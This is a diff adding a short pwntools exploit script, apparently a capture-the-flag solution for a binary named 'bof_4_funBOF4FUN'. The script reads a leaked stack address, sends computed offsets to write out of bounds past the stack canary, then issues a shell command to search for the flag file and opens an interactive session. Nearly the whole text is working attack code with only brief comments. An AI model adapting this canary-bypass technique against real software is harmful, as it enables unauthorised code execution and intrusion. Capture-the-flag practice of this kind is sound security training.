@@ -1,0 +1,23 @@
+from pwn import *
+
+# out of bound to bypass the canary smash
+
+p = process("./bof_4_funBOF4FUN")
+'''
+p = gdb.debug("./bof_4_funBOF4FUN", gdbscript =
+b *vuln + 25
+b *vuln + 97
+r
+)
+'''
+p.recvuntil(b" present: ")
+stack_addr = int(p.recvline(), 16)
+p.sendlineafter(b"lucky number: ", str(stack_addr + 3 * 0x8))
+print(hex(stack_addr + 27 * 0x8))
+p.sendlineafter(b"second number: ", b'27')
+
+# input depend on the server
+p.sendlineafter(b"'cat')", b"find ./ -name '*fla[g]*' -ls")
+#p.sendlineafter(b"view? ", b"flag.txt")
+
+p.interactive()
